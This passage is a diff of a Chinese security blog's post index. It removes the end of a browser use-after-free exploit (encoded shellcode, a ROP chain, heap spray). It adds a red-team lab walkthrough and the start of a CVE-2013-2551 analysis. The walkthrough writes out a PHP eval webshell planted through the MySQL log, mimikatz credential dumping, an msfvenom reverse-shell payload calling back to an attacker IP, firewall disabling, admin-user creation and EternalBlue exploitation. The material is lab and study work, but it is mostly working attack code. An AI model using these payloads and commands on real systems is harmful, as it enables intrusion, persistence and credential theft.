class="string">&quot;%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u3072%u88db%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff5f%uffff%u6f68%u5878%u6820%u6761%u4265%u4d68%u7365%u3173%u88db%u245c%u890a%u68e3%u2058%u2020%u4d68%u4653%u6821%u6f72%u206d%u6f68%u202c%u6866%u6548%u6c6c%uc931%u4c88%u1024%ue189%ud231%u5352%u5251%ud0ff%uc031%uff50%u0855&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">        <span class="keyword">var</span> rop_gadgets = <span class="built_in">unescape</span>(</span><br><span class="line">            <span class="string">&quot;%u5b4f%u7c36&quot;</span> + <span class="comment">// 0x7c365b4f : ,# POP EBX # POP EBP # RET [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%u0201%u0000&quot;</span> + <span class="comment">// 0x00000201 : ,# 0x00000201-&gt; ebx</span></span><br><span class="line">            <span class="string">&quot;%u8b05%u7c34&quot;</span> + <span class="comment">// 0x7c348b05: ,# XCHG EAX,ESP # RETN</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ebp:---] :</span></span><br><span class="line">            <span class="string">&quot;%u6d28%u7c35&quot;</span> + <span class="comment">// 0x7c356d28 : ,# POP EBP # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%u6d28%u7c35&quot;</span> + <span class="comment">// 0x7c356d28 : ,# skip 4 bytes [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ebx:---] :</span></span><br><span class="line">            <span class="comment">// &quot;%u09cf%u7c36&quot; + // 0x7c3609cf : ,# POP EBX # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="comment">// &quot;%u0201%u0000&quot; + // 0x00000201 : ,# 0x00000201-&gt; ebx</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_edx:---] :</span></span><br><span class="line">            <span class="string">&quot;%u4f8e%u7c34&quot;</span> + <span class="comment">// 0x7c344f8e : ,# POP EDX # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%u0040%u0000&quot;</span> + <span class="comment">// 0x00000040 : ,# 0x00000040-&gt; edx</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ecx:---] :</span></span><br><span class="line">            <span class="string">&quot;%u8ab2%u7c35&quot;</span> + <span class="comment">// 0x7c358ab2 : ,# POP ECX # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%uf2a1%u7c38&quot;</span> + <span class="comment">// 0x7c38f2a1 : ,# &amp;Writable location [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_edi:---] :</span></span><br><span class="line">            <span class="string">&quot;%ue239%u7c36&quot;</span> + <span class="comment">// 0x7c36e239 : ,# POP EDI # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%ud202%u7c34&quot;</span> + <span class="comment">// 0x7c34d202 : ,# RETN (ROP NOP) [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_esi:---] :</span></span><br><span class="line">            <span class="string">&quot;%uf8f8%u7c34&quot;</span> + <span class="comment">// 0x7c34f8f8 : ,# POP ESI # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%u15a2%u7c34&quot;</span> + <span class="comment">// 0x7c3415a2 : ,# JMP [EAX] [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%u6747%u7c37&quot;</span> + <span class="comment">// 0x7c376747 : ,# POP EAX # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;%ua151%u7c37&quot;</span> + <span class="comment">// 0x7c37a140 : ,# ptr to &amp;VirtualProtect() [IAT MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:pushad:---] :</span></span><br><span class="line">            <span class="string">&quot;%u8c81%u7c37&quot;</span> + <span class="comment">// 0x7c378c81 : ,# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:extras:---] :</span></span><br><span class="line">            <span class="string">&quot;%u5c30%u7c34&quot;</span> + <span class="comment">// 0x7c345c30 : ,# ptr to &#x27;push esp # ret &#x27; [MSVCR71.dll]</span></span><br><span class="line">            <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> nop = <span class="built_in">unescape</span>(<span class="string">&quot;%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090&quot;</span>);</span><br><span class="line">        rop_gadgets += nop;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_size; i++)</span><br><span class="line">            nop += <span class="built_in">unescape</span>(<span class="string">&quot;%u9090&quot;</span>);</span><br><span class="line">        nop = nop.substring(<span class="number">0</span>, block_size - rop_gadgets.length - shellcode.length - filler.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> block = filler + rop_gadgets + shellcode + nop;</span><br><span class="line">        block = alloc(<span class="number">0xfffe0</span>, block);<span class="comment">//1MB堆内存</span></span><br><span class="line">        len_block = block.length;</span><br><span class="line">        heap_chunks = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">150</span>; i++)</span><br><span class="line">            heap_chunks[i] = block.substr(<span class="number">0</span>, block.length);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;iframe src=<span class="string">&quot;../hpIpD0pjgv/UGuQTe.html&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<img src="https://i.loli.net/2021/04/28/QvIqxhnyRTKB9e6.png" style="zoom:80%;" />
-
-<h2 id="五、参考文献"><a href="#五、参考文献" class="headerlink" title="五、参考文献"></a>五、参考文献</h2><ul>
-<li><a href="https://www.anquanke.com/post/id/85592">https://www.anquanke.com/post/id/85592</a></li>
-<li><a href="https://www.52pojie.cn/thread-596064-1-1.html">https://www.52pojie.cn/thread-596064-1-1.html</a></li>
-<li><a href="https://blog.csdn.net/qs_hud/article/details/9821735">https://blog.csdn.net/qs_hud/article/details/9821735</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>二进制安全</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-        <tag>远程代码执行</tag>
-        <tag>UAF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>动态链接-ret2dlresolve</title>
     <url>/2021/05/18/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5-ret2dlresolve/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复习一下动态链接的全过程，通过plt和got的延迟绑定详细过程，彻底理解了ret2dlresolve</p>
@@ -920,6 +704,304 @@
       </categories>
       <tags>
         <tag>ROP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnstack-ATT&amp;CK红队实战靶场一</title>
+    <url>/2021/08/18/vulnstack-ATT&amp;CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%80/</url>
+    <content><![CDATA[<h1 id="vulnstack-ATT-amp-CK红队实战靶场一"><a href="#vulnstack-ATT-amp-CK红队实战靶场一" class="headerlink" title="vulnstack-ATT&amp;CK红队实战靶场一"></a>vulnstack-ATT&amp;CK红队实战靶场一</h1><p>红日安全团队分享的实战靶机一下载地址<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<span id="more"></span>
+
+<h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><img src="https://i.loli.net/2021/08/18/g9sc834BIz7maY5.png"  style="zoom:80%;" />
+
+<ul>
+<li>攻击机kali：外网192.168.112.132</li>
+<li>win7：内网192.168.176.143 外网192.168.112.164</li>
+<li>win2003：内网192.168.176.141</li>
+<li>win2008：内网192.168.176.138</li>
+</ul>
+<p>确保同网段主机相互ping通，win7作为webserver开启phpstudy</p>
+<h2 id="二、web攻击"><a href="#二、web攻击" class="headerlink" title="二、web攻击"></a>二、web攻击</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>用nmap探测同网段的目标</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sP 192.168.112.0/24</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/pYE8vfLImN3WdiT.png"  style="zoom:80%;" />
+
+<p>扫描到目标主机192.168.112.164，继续nmap探测</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.112.164</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/PydfWIgxK73MNUR.png"  style="zoom:80%;" />
+
+<p>dirsearch扫描站点目录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.112.164</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/QCNXta73jpdwleY.png" style="zoom:80%;" />
+
+<p>发现有phpmyadmin后台管理和网站备份文件</p>
+<h3 id="mysql数据库getshell"><a href="#mysql数据库getshell" class="headerlink" title="mysql数据库getshell"></a>mysql数据库getshell</h3><p>从phpstudy探针获取站点的绝对路径</p>
+<img src="https://i.loli.net/2021/08/18/ofOZjeuJK2HMPbF.png" style="zoom: 80%;" />
+
+<p>弱口令root-root进入phpmyadmin后台，通过后台上传webshell，首先查看mysql用户权限</p>
+<img src="https://i.loli.net/2021/08/18/x7B8vklsdhnIPfR.png"  style="zoom:80%;" />
+
+<p>执行命令查看secure_file_priv</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> &quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/By1Sh9zbNc4UWeQ.png"  style="zoom:80%;" />
+
+<p>secure_file_priv为NULL无法进行文件写入，使用SELECT INTO OUTFILE方法无效，方法二，使用日志上传webshell</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%general%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/WrVnmXY4SxKZ5yD.png" style="zoom:80%;" />
+
+<p>打开日志功能，将日志文件更改为可连接的路径c:/phpstudy/WWW/webshell.php</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;	#打开日志写入功能</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;c:/phpstudy/WWW/webshell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/TS4GtiW6aNrxcI2.png" style="zoom:80%;" />
+
+<p>向日志中写入webshell，并用菜刀连接</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/aetd7k9hiEIFNu2.png"  style="zoom:80%;" />
+
+<h3 id="通过yxcms-getshell"><a href="#通过yxcms-getshell" class="headerlink" title="通过yxcms getshell"></a>通过yxcms getshell</h3><p>在路径扫描时发现网站备份文件beifen.rar，从中获取信息，进入网站<a href="http://192.168.112.164/yxcms/%EF%BC%8C%E5%9C%A8%E4%B8%BB%E9%A1%B5%E9%9D%A2%E6%89%BE%E5%88%B0%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0">http://192.168.112.164/yxcms/，在主页面找到网站后台相关信息，进入后台</a></p>
+<img src="https://i.loli.net/2021/08/18/SVXGdFi81gtq5pa.png" style="zoom:80%;" />
+
+<p>在前台模板发现能够创建和编辑页面，创建一个一句话木马的php文件</p>
+<img src="https://i.loli.net/2021/08/18/HBmEwLVfjpQkXAR.png" style="zoom:80%;" />
+
+<p>访问创建的php木马，路径从备份文件中搜索，<a href="http://192.168.112.164/yxcms/protected/apps/default/view/default/new_shell.php%EF%BC%8C%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF">http://192.168.112.164/yxcms/protected/apps/default/view/default/new_shell.php，菜刀连接即可</a></p>
+<h2 id="三、内网渗透"><a href="#三、内网渗透" class="headerlink" title="三、内网渗透"></a>三、内网渗透</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>webshell上传cs生成的木马，在命令行运行木马</p>
+<img src="https://i.loli.net/2021/08/18/HO8isU1g3LVflAn.png" style="zoom:80%;" />
+
+<p>目标在cs上线</p>
+<img src="https://i.loli.net/2021/08/18/SE5NOUu3KkRtpdI.png" style="zoom:80%;" />
+
+<p>依次执行以下命令，获取信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systeminfo		//获取操作系统版本，补丁信息</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/3FqvRBUabWfZ6Sj.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/JhNoYy9LuDObaxi.png" style="zoom:80%;" />
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ipconfig /all	//查看所属域</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/SwjMc4Wa1ybDleH.png" style="zoom:80%;" />
+
+<p> 查看域信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net view /domain 判断存在域</span><br><span class="line">net user /domain 当前域里面的用户</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 查询域管理员账户</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查询域控制器</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/MjkLAZmgJxcI4YQ.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/9RiKZ7gHwUT5jqe.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/FqeTd8R2DxCKE5z.png" style="zoom:80%;" />
+
+<p>内网主机探测</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/VXGWRhwPfaYku2U.png" style="zoom:80%;" />
+
+<p>cs命令探测</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/meWOPcGE76IykRt.png" style="zoom:80%;" />
+
+<p>总结：</p>
+<p>OWA 192.168.176.138为域控，STU1为本机，ROOT-TVI862UBEH 192.168.176.141为域成员，域管理员用户为administrator和liukaifeng01</p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>cs提权，获得system权限</p>
+<img src="https://i.loli.net/2021/08/18/eEWuxvO5jy7B4TC.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/3G27LHneE4jfBDt.png" style="zoom:80%;" />
+
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>运行mimikatz，获取密钥</p>
+<img src="https://i.loli.net/2021/08/18/kD5HmGzohwb6BSF.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/TXAED5l9jhacmMS.png" style="zoom:80%;" />
+
+<h4 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h4><p>由于攻击机无法与内网的主机进行直接通信，所以用到SMB Beacon</p>
+<p>首先，利用SMB服务可以通过明文或hash传递来远程执行，条件是445服务端口开放，探测内网445端口开放情况</p>
+<img src="https://i.loli.net/2021/08/18/IYS3n92aABRmDZF.png" style="zoom:80%;" />
+
+<p>其他两条主机均开放445端口</p>
+<p>新建smb监听器</p>
+<img src="https://i.loli.net/2021/08/18/pNnEfWsMmSxkteT.png" style="zoom:80%;" />
+
+<p>用psexec和刚才窃取的令牌对域控进行smb连接</p>
+<img src="https://i.loli.net/2021/08/18/AlzgQmJ9L1t2Yau.png" style="zoom:80%;" />
+
+<p>拿到域控OWA 192.168.112.138的权限</p>
+<img src="https://i.loli.net/2021/08/18/7DJv6TNHdAu3OPm.png" style="zoom:80%;" />
+
+<p>重复之前的步骤，可以获得另一台主机192.168.176.141的权限</p>
+<img src="https://i.loli.net/2021/08/18/N4ErJ6R5GIwM1HW.png" style="zoom:80%;" />
+
+<p>到这里渗透基本结束，除了用cs进行渗透，也可用msf</p>
+<h3 id="MSF实现内网漫游"><a href="#MSF实现内网漫游" class="headerlink" title="MSF实现内网漫游"></a>MSF实现内网漫游</h3><p>kali中运行msf生成木马</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.112.132 LPORT=4444 -f exe &gt; /tmp/msf.exe</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/xnCNER3PyotrwfQ.png" style="zoom:80%;" />
+
+<p>msf监听</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.112.132</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>webshell上传木马并运行，msf连接成功</p>
+<img src="https://i.loli.net/2021/08/18/wMIHVYoUEQSq2cz.png" style="zoom:80%;" />
+
+<p>进行信息收集之后执行mimikatz（kiwi）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getsystem</span><br><span class="line">load mimikatz	</span><br><span class="line">creds_msv		//获取密码hash值</span><br><span class="line">creds_kerberos	//获取密码明文</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="https://i.loli.net/2021/08/18/ulAZLyrC9qsTBJo.png" style="zoom:80%;" />
+
+<h4 id="路由转发"><a href="#路由转发" class="headerlink" title="路由转发"></a>路由转发</h4><p>获取主机路由信息，并添加内网的路由，目的是为了让msf的流量转发到内网</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">route 		//查看路由地址</span><br><span class="line">background	//回退到msf</span><br><span class="line">route add 192.168.176.0 255.255.255.0 1	//对sessions添加内网的路由</span><br><span class="line">route print	//查看路由表</span><br></pre></td></tr></table></figure>
+
+<p>也可使用<code>post/multi/manage/autoroute</code>模块自动添加路由，接下来用proxychains实现内网漫游</p>
+<img src="https://i.loli.net/2021/08/18/HZc6Tur1JWj8Yk3.png" style="zoom:80%;" />
+
+<h4 id="漏洞发现利用"><a href="#漏洞发现利用" class="headerlink" title="漏洞发现利用"></a>漏洞发现利用</h4><p>使用nmap对目标192.168.176.138和192.168.176.141进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo proxychains nmap -sT -Pn -p22,80,443,135,445 --script=smb-vuln-ms17-010.nse 192.168.176.138</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意：</strong>由于proxychains无法代理icmp的数据包 所以必须添加-Pn参数 即不检测主机是否存活 直接进行端口tcp扫描</p>
+</blockquote>
+<p>发现均开放445端口，存在ms17-010漏洞</p>
+<blockquote>
+<p>其他msf扫描模块<br>auxiliary/scanner/portscan　    端口扫描<br>scanner/portscan/syn　　        SYN端口扫描<br>scanner/portscan/tcp　　        TCP端口扫描<br>auxiliary/scanner/smb/smb_ms17_010 </p>
+</blockquote>
+<img src="https://i.loli.net/2021/08/18/pbqLnTi9wDY3rdv.png" style="zoom:80%;" />
+
+<p>使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//执行shell命令</span><br><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set RHOSTS 192.168.176.138</span><br><span class="line">set COMMAND netsh advfirewall set allprofiles state off	//关闭防火墙</span><br><span class="line">set command net user zqh !@#123qwe!@# /add 				//添加用户</span><br><span class="line">set command net localgroup administrators zqh /add 		//管理员权限</span><br><span class="line">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;			//打开3389</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">//ms17-010漏洞利用</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts 192.168.176.138</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>但是ms17_010_eternalblue会使win2008宕机重启，且仅适用于x64系统，这里添加管理员用户，用远程桌面登录，也可用之前mimikatz获取的用户登录</p>
+<img src="https://i.loli.net/2021/08/18/6CcPWNi879Io1ET.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/M3FqvyoG9thpDmn.png" style="zoom:80%;" />
+
+<p>最后exploit/windows/smb/ms17_010_psexec反弹shell，可获取更多信息</p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><p><a href="http://blog.leanote.com/post/snowming/8b7ce0f84c03">http://blog.leanote.com/post/snowming/8b7ce0f84c03</a></p>
+<p><a href="https://v0w.top/2020/07/19/vulnstack1">https://v0w.top/2020/07/19/vulnstack1</a></p>
+<p><a href="https://www.cxyzjd.com/article/u014029795/117375754">https://www.cxyzjd.com/article/u014029795/117375754</a></p>
+<p><a href="http://47.100.93.13/index.php/archives/909/">http://47.100.93.13/index.php/archives/909/</a></p>
+<p><a href="https://www.cnblogs.com/liliyuanshangcao/p/13743389.html">https://www.cnblogs.com/liliyuanshangcao/p/13743389.html</a></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CVE-2013-2551漏洞分析</title>
+    <url>/2021/08/18/CVE-2013-2551%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
+<li>漏洞编号：CVE-2013-2551</li>
+<li>漏洞类型：整数溢出<span id="more"></span>
+<h3 id="2-概述"><a href="#2-概述" class="headerlink" title="2. 概述"></a>2. 概述</h3></li>
+</ul>
+<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h3 id="1-分析环境"><a href="#1-分析环境" class="headerlink" title="1. 分析环境"></a>1. 分析环境</h3><ul>
+<li>win7 x86 sp1</li>
+<li>windbg</li>
+<li>IDA PRO</li>
+<li>IExplore 8</li>
+</ul>
+<h3 id="2-背景知识"><a href="#2-背景知识" class="headerlink" title="2. 背景知识"></a>2. 背景知识</h3><p>Vector Markup Language (VML)是基于xml文件格式用于显示二维矢量图像的。</p>
+<p>标记使用的是XML扩展，需要一个namespace(命名空间)，可以使用惯用的“v”作为命名空间，而在这里，它的用处是把命名空间“v”和系统预定义的行为VML连接。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:v</span>=<span class="string">&quot;urn:schemas-microsoft-com:vml&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="css">v\:* &#123; Behavior: <span class="built_in">url</span>(<span class="string">#default#VML</span>) &#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>VML标记，shape可以为Oval(圆)，Line(线)等图形。 <a href="https://docs.microsoft.com/zh-cn/windows/win32/vml/shape-element--vml">Shape</a> 元素内可以定义 <a href="https://docs.microsoft.com/zh-cn/windows/win32/vml/msdn-online-vml-stroke-element">Stroke</a>元素：用来定义shape的笔划，stroke的属性 DashStyle 用于指定描边的点线和虚线图案，正是存在漏洞的属性</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">v:shape</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">v:stroke</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">v:shape</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h3><p>获取POC，触发漏洞</p>
+<p>开启页堆，重新调试，进程出现地址访问错误</p>
+<img src="https://i.loli.net/2021/08/18/qTjRadhk8KJUEec.png" style="zoom:80%;" />
+
+<p>栈回溯</p>
+<img src="https://i.loli.net/2021/08/18/vhBTKMA8rZRkfE1.png" style="zoom:80%;" />
+
+<p>在vgx!ORG::GET 函数下断点，重新调试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sxe ld vgx.dll   #使程序加载vgx.dll的时候断下</span><br><span class="line">bp vgx!ORG::Get</span><br></pre></td></tr></table></figure>
+
+<p>IDA加载VGX.dll，查看ORG::Get函数</p>
+<img src="https://i.loli.net/2021/08/18/nM51GtFeWimofEB.png" style="zoom:80%;" />
+
+<p>结合windbg调试，a1是一个this指针指向vftable，程序将a1的内容进行计算得到源地址，并赋值给a2，由于经a1得到的地址访问错误导致崩溃。因此需要找到改变vftable内容的函数</p>
+<img src="https://i.loli.net/2021/08/18/cURBtPO4MegWaId.png" style="zoom:80%;" />
+
+<p>这里无法找到漏洞成因，那么需要继续栈回溯到vgx!COALineDashStyleArray::get_item，由于函数的第一个参数是this指针，上一个调用函数不在vgx.dll中，回溯意义不大。</p>
+<img src="https://i.loli.net/2021/08/18/qSnUJC9e7vcwAbg.png" style="zoom:80%;" />
+
+<p>可以推断两个ORG::Get和get_item函数都是用于触发异常，简单的回溯无法判断漏洞位置，应该从poc入手</p>
+<h4 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h4><p>在创建好vml元素的命名空间后，调用函数createRects()，创建vml元素数组。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建vml元素数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createRects</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">		rect_array[i] = <span class="built_in">document</span>.createElement(<span class="string">&quot;v:shape&quot;</span>)</span><br><span class="line">		rect_array[i].id = <span class="string">&quot;rect&quot;</span> + i.toString()</span><br><span class="line">		<span class="built_in">document</span>.body.appendChild(rect_array[i])</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>并定义两个vml元素vml1和shape，按钮button绑定点击事件crashme()，触发漏洞</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;v:oval&gt;</span><br><span class="line">	&lt;v:stroke id=<span class="string">&quot;vml1&quot;</span> /&gt;</span><br><span class="line">&lt;/v:oval&gt;</span><br><span class="line">&lt;v:oval&gt;</span><br><span class="line">	&lt;v:stroke dashstyle=<span class="string">&quot;2 2 2 0 2 2 2 0&quot;</span> id=<span class="string">&quot;shape&quot;</span> /&gt;</span><br><span class="line">&lt;/v:oval&gt;</span><br><span class="line">&lt;input value=<span class="string">&quot;crash!!!&quot;</span> type=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;crashme();&quot;</span>&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>
+
